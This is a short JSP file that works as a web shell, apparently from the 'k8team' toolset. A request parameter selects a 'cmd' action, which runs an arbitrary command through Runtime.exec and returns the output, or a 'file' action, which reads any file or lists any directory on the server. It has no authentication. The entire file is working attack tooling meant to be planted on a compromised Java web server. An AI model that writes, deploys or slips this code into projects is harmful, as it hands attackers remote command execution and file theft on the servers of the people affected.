<%@page import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*" %>
<%!
    String k8team = "k8team";

    byte[] toBytes(InputStream in) throws IOException {
        int                   a     = 0;
        byte[]                bytes = new byte[1024];
        ByteArrayOutputStream baos  = new ByteArrayOutputStream();

        while ((a = in.read(bytes)) != -1) {
            baos.write(bytes, 0, a);
        }

        in.close();

        return baos.toByteArray();
    }

    String execCommand(String command) throws IOException {
        return new String(toBytes(Runtime.getRuntime().exec(command).getInputStream()));
    }

    String readFile(String file) throws IOException {
        File path = new File(file);

        if (path.isFile()) {
            return new String(toBytes(new FileInputStream(file)));
        } else {
            return Arrays.toString(path.list());
        }
    }
%>
<%
    String action = request.getParameter(k8team);
    String z0 = request.getParameter("z0");

    if ("cmd".equals(action)) {
        out.println(execCommand(z0));
    } else if ("file".equals(action)) {
        out.println(readFile(z0));
    }
%>